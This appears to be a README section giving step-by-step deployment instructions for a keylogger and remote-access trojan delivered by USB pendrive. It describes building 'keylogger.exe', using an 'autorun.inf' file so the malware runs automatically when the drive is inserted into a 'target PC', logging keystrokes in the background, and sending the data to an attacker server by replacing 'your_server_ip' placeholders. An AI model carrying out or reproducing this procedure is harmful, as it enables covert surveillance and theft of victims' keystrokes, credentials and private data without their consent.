### Steps to Deploy

1. **Prepare the Environment**:

   - Install the required packages:
     ```sh
     pip install -r requirements.txt
     ```
   - Create the executable:
     ```sh
     python setup.py build
     ```

2. **Prepare the Pendrive**:

   - Copy the `keylogger.exe` (the executable created by `cx_Freeze`) to the root of the pendrive.
   - Copy the `autorun.inf` file to the root of the pendrive.
   - Copy the `rat.py` script to the root of the pendrive.
   - Copy the `key.key` file to the root of the pendrive.

3. **Insert the Pendrive into the Target PC**:

   - Insert the prepared pendrive into the target PC.
   - The `autorun.inf` file will trigger the execution of `keylogger.exe` automatically.
   - The keylogger will start running in the background, logging keystrokes and collecting metadata.

4. **Server Setup**:
   - Set up a server to handle HTTP requests and socket connections.
   - Replace `http://your_server_ip/log` in `keylogger.py` and `your_server_ip` in `rat.py` with the actual IP address of your server.
